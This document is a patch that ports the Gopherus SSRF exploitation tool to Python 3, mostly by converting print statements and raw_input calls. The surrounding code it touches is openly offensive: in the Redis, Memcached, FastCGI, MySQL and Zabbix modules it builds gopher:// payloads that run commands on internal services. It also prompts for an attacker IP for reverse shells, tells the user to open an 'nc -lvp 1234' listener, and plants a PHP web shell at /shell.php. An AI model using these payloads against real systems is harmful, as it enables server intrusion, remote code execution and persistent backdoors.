@@ -1,0 +1,255 @@
+diff --git a/gopherus.py b/gopherus.py
+index e7dd713..d40bd7f 100755
+--- a/gopherus.py
++++ b/gopherus.py
+@@ -1 +1 @@
+-#!/usr/bin/python2
++#!/usr/bin/env python3
+@@ -28,2 +28 @@ class colors:
+-print colors.green + """
+-
++print(colors.green + r"""
+@@ -36 +35 @@ print colors.green + """
+-""" + "\n\t\t" + colors.blue + "author: " + colors.orange + "$_SpyD3r_$" + "\n" + colors.reset
++""" + "\n\t\t" + colors.blue + "author: " + colors.orange + "$_SpyD3r_$" + "\n" + colors.reset)
+@@ -39 +38 @@ if(not args.exploit):
+-    print parser.print_help()
++    print(parser.print_help())
+@@ -63 +62 @@ else:
+-    print parser.print_help()
++    print(parser.print_help())
+diff --git a/scripts/DumpMemcached.py b/scripts/DumpMemcached.py
+index cd7a24f..bd81270 100644
+--- a/scripts/DumpMemcached.py
++++ b/scripts/DumpMemcached.py
+@@ -4 +4 @@ def DumpMemcached():
+-    code = raw_input("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
++    code = input("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
+@@ -10,3 +10,3 @@ def DumpMemcached():
+-    print "\033[93m" +"\nYour gopher link is ready to dump Memcache : \n"+ "\033[0m"
+-    print finalpayload
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+ "\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to dump Memcache : \n"+ "\033[0m")
++    print(finalpayload)
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+ "\033[0m")
+\ No newline at end of file
+diff --git a/scripts/FastCGI.py b/scripts/FastCGI.py
+index edf6b12..4d3c290 100644
+--- a/scripts/FastCGI.py
++++ b/scripts/FastCGI.py
+@@ -4 +4 @@ def FastCGI():
+-    filename = raw_input("\033[96m" +"Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  "+ "\033[0m")
++    filename = input("\033[96m" +"Give one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  "+ "\033[0m")
+@@ -9 +9 @@ def FastCGI():
+-    command=raw_input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
++    command=input("\033[96m" +"Terminal command to run:  "+ "\033[0m")
+@@ -32,3 +32,3 @@ def FastCGI():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m"
+-    print "\033[04m" + get_payload(payload)+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
++    print("\033[04m" + get_payload(payload)+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
+diff --git a/scripts/MySQL.py b/scripts/MySQL.py
+index 8353f9b..213b59c 100644
+--- a/scripts/MySQL.py
++++ b/scripts/MySQL.py
+@@ -3,2 +3,2 @@ def MySQL():
+-    print "\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m"
+-    user = raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")
++    print("\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m")
++    user = input("\033[96m" +"\nGive MySQL username: " + "\033[0m")
+@@ -16 +16 @@ def MySQL():
+-    query = raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")
++    query = input("\033[96m" +"Give query to execute: "+ "\033[0m")
+@@ -36,3 +36,3 @@ def MySQL():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
+-    print "\033[04m" + get_payload(query)+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
++    print("\033[04m" + get_payload(query)+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
+diff --git a/scripts/PHPMemcached.py b/scripts/PHPMemcached.py
+index 6de9da9..a84cab2 100644
+--- a/scripts/PHPMemcached.py
++++ b/scripts/PHPMemcached.py
+@@ -4,3 +4,2 @@ def PHPMemcached():
+-    print "\033[01m" + "\nThis is usable when you know Class and Variable name used by user\n"+ "\033[0m"
+-
+-    code = raw_input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")
++    print("\033[01m" + "\nThis is usable when you know Class and Variable name used by user\n"+ "\033[0m")
++    code = input("\033[96m" +"Give serialization payload\nexample: O:5:\"Hello\":0:{}   : "+ "\033[0m")
+@@ -9 +8 @@ def PHPMemcached():
+-        print "\033[93m" + "Plz give payload" + "\033[0m"
++        print("\033[93m" + "Plz give payload" + "\033[0m")
+@@ -16,5 +15,5 @@ def PHPMemcached():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
+-    print "\033[04m" + "gopher://127.0.0.1:11211/_" + finalpayload + "\033[0m"
+-    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
+-    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
++    print("\033[04m" + "gopher://127.0.0.1:11211/_" + finalpayload + "\033[0m")
++    print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
++    print("\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
+diff --git a/scripts/PostgreSQL.py b/scripts/PostgreSQL.py
+index 16b4d68..6537bcf 100644
+--- a/scripts/PostgreSQL.py
++++ b/scripts/PostgreSQL.py
+@@ -2,3 +2,3 @@ def PostgreSQL():
+-	user = raw_input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
+-	db = raw_input("\033[96m" + "Database Name: " + "\033[0m")
+-	query = raw_input("\033[96m" + "Query: " + "\033[0m")
++	user = input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
++	db = input("\033[96m" + "Database Name: " + "\033[0m")
++	query = input("\033[96m" + "Query: " + "\033[0m")
+@@ -21 +21 @@ def PostgreSQL():
+-	        return "gopher://127.0.0.1:5432/_%" + "%".join(a)
++		return "gopher://127.0.0.1:5432/_%" + "%".join(a)
+@@ -24,3 +24,3 @@ def PostgreSQL():
+-	print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
+-	print "\033[04m" + encode(packet) + "\033[0m"
+-	print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++	print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
++	print("\033[04m" + encode(packet) + "\033[0m")
++	print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+diff --git a/scripts/PyMemcached.py b/scripts/PyMemcached.py
+index ae8f5b5..7682e9d 100644
+--- a/scripts/PyMemcached.py
++++ b/scripts/PyMemcached.py
+@@ -1 +1 @@
+-import cPickle
++import pickle as cPickle
+@@ -6,2 +6,2 @@ def PyMemcached():
+-    print "\033[01m" +"\nReady to Get Reverse SHELL\n"+ "\033[0m"
+-    server = raw_input("\033[96m" +"Give server IP you want to connect (default is 127.0.0.1): "+ "\033[0m")
++    print("\033[01m" +"\nReady to Get Reverse SHELL\n"+ "\033[0m")
++    server = input("\033[96m" +"Give server IP you want to connect (default is 127.0.0.1): "+ "\033[0m")
+@@ -26,8 +26,6 @@ def PyMemcached():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
+-    print "\033[04m" + "gopher://127.0.0.1:11211/_" + get_payload(command)+ "\033[0m"
+-
+-    print "\033[01m" +"\nThen You can connect it with : nc " + server + " 1234"+ "\033[0m"
+-
+-    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
+-    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
++    print("\033[04m" + "gopher://127.0.0.1:11211/_" + get_payload(command)+ "\033[0m")
++    print("\033[01m" +"\nThen You can connect it with : nc " + server + " 1234"+ "\033[0m")
++    print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
++    print("\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+diff --git a/scripts/RbMemcached.py b/scripts/RbMemcached.py
+index 3c1ffac..30fec92 100644
+--- a/scripts/RbMemcached.py
++++ b/scripts/RbMemcached.py
+@@ -4,2 +4,2 @@ def RbMemcached():
+-    print "\033[01m" +"\nReady to Get Reverse SHELL\n"+ "\033[0m"
+-    server = raw_input("\033[96m" +"Give server IP you want to connect (default is 127.0.0.1): "+ "\033[0m")
++    print("\033[01m" +"\nReady to Get Reverse SHELL\n"+ "\033[0m")
++    server = input("\033[96m" +"Give server IP you want to connect (default is 127.0.0.1): "+ "\033[0m")
+@@ -22,8 +22,6 @@ def RbMemcached():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
+-    print "\033[04m" +"gopher://127.0.0.1:11211/_" + get_payload(payload)+ "\033[0m"
+-
+-    print "\033[01m" +"\nThen You can connect it with : nc " + server + " 1234"+ "\033[0m"
+-
+-    print "\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m"
+-    print "\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
++    print("\033[04m" +"gopher://127.0.0.1:11211/_" + get_payload(payload)+ "\033[0m")
++    print("\033[01m" +"\nThen You can connect it with : nc " + server + " 1234"+ "\033[0m")
++    print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
++    print("\033[04m" + "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
+diff --git a/scripts/Redis.py b/scripts/Redis.py
+index fbea515..caeef2d 100644
+--- a/scripts/Redis.py
++++ b/scripts/Redis.py
+@@ -5,2 +5,2 @@ def Redis():
+-        server = raw_input("\033[96m" +"\nGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): "+ "\033[0m")
+-        crontab_dir = raw_input("\033[96m" +"What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "+ "\033[0m")
++        server = input("\033[96m" +"\nGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): "+ "\033[0m")
++        crontab_dir = input("\033[96m" +"What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "+ "\033[0m")
+@@ -52,7 +52,4 @@ save\r
+-        print "\033[93m" +"\nYour gopher link is ready to get Reverse Shell: \n"+ "\033[0m"
+-        print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
+-        print "\033[01m" +"\nBefore sending request plz do `nc -lvp 1234`"+ "\033[0m"
+-        print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+-
+-
+-
++        print("\033[93m" +"\nYour gopher link is ready to get Reverse Shell: \n"+ "\033[0m")
++        print("\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
++        print("\033[01m" +"\nBefore sending request plz do `nc -lvp 1234`"+ "\033[0m")
++        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+@@ -60,2 +57,2 @@ save\r
+-        web_root_location = raw_input("\033[96m" +"\nGive web root location of server (default is /var/www/html): "+ "\033[0m")
+-        php_payload = raw_input("\033[96m" +"Give PHP Payload (We have default PHP Shell): "+ "\033[0m")
++        web_root_location = input("\033[96m" +"\nGive web root location of server (default is /var/www/html): "+ "\033[0m")
++        php_payload = input("\033[96m" +"Give PHP Payload (We have default PHP Shell): "+ "\033[0m")
+@@ -105,8 +102,6 @@ save\r
+-        print "\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m"
+-        print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
+-        print "\033[01m"+"\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "+ "\033[0m"
+-        print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+-
+-
+-    print "\033[01m"+"\nReady To get SHELL\n"+ "\033[0m"
+-    what = raw_input("\033[35m" +"What do you want?? (ReverseShell/PHPShell): "+ "\033[0m")
++        print("\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m")
++        print("\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
++        print("\033[01m"+"\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "+ "\033[0m")
++        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
++    print("\033[01m"+"\nReady To get SHELL\n"+ "\033[0m")
++    what = input("\033[35m" +"What do you want?? (ReverseShell/PHPShell): "+ "\033[0m")
+@@ -119 +114 @@ save\r
+-        print "\033[93m" +"Plz choose between those two"+ "\033[0m"
++        print("\033[93m" +"Plz choose between those two"+ "\033[0m")
+diff --git a/scripts/SMTP.py b/scripts/SMTP.py
+index a005fd0..9c41ed9 100644
+--- a/scripts/SMTP.py
++++ b/scripts/SMTP.py
+@@ -4,5 +4,5 @@ def SMTP():
+-    print "\033[01m"+"\nGive Details to send mail: \n"+ "\033[0m"
+-    mailfrom = raw_input("\033[96m" +"Mail from :  "+ "\033[0m")
+-    Mailto = raw_input("\033[96m" +"Mail To :  "+ "\033[0m")
+-    subject = raw_input("\033[96m" +"Subject :  "+ "\033[0m")
+-    msg = raw_input("\033[96m" +"Message :  "+ "\033[0m")
++    print("\033[01m"+"\nGive Details to send mail: \n"+ "\033[0m")
++    mailfrom = input("\033[96m" +"Mail from :  "+ "\033[0m")
++    Mailto = input("\033[96m" +"Mail To :  "+ "\033[0m")
++    subject = input("\033[96m" +"Subject :  "+ "\033[0m")
++    msg = input("\033[96m" +"Message :  "+ "\033[0m")
+@@ -23,3 +23,3 @@ def SMTP():
+-    print "\033[93m" +"\nYour gopher link is ready to send Mail: \n"+ "\033[0m"
+-    print "\033[04m" +"gopher://127.0.0.1:25/_" + finalpayload+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to send Mail: \n"+ "\033[0m")
++    print("\033[04m" +"gopher://127.0.0.1:25/_" + finalpayload+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
+diff --git a/scripts/Zabbix.py b/scripts/Zabbix.py
+index 216faed..7a68e34 100644
+--- a/scripts/Zabbix.py
++++ b/scripts/Zabbix.py
+@@ -4,2 +4,2 @@ def Zabbix():
+-    print "\033[01m"+"\nExecute SHELL command: \n" + "\033[0m"
+-    command = raw_input("\033[96m" +"\nEnter Shell Command to Execute: "+ "\033[0m")
++    print("\033[01m"+"\nExecute SHELL command: \n" + "\033[0m")
++    command = input("\033[96m" +"\nEnter Shell Command to Execute: "+ "\033[0m")
+@@ -13,3 +13,3 @@ def Zabbix():
+-    print "\033[93m" +"\nYour gopher link is ready to do SSRF: \n"+ "\033[0m"
+-    print "\033[04m" +"gopher://127.0.0.1:10050/_" + finalpayload+ "\033[0m"
+-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
++    print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n"+ "\033[0m")
++    print("\033[04m" +"gopher://127.0.0.1:10050/_" + finalpayload+ "\033[0m")
++    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
+\ No newline at end of file
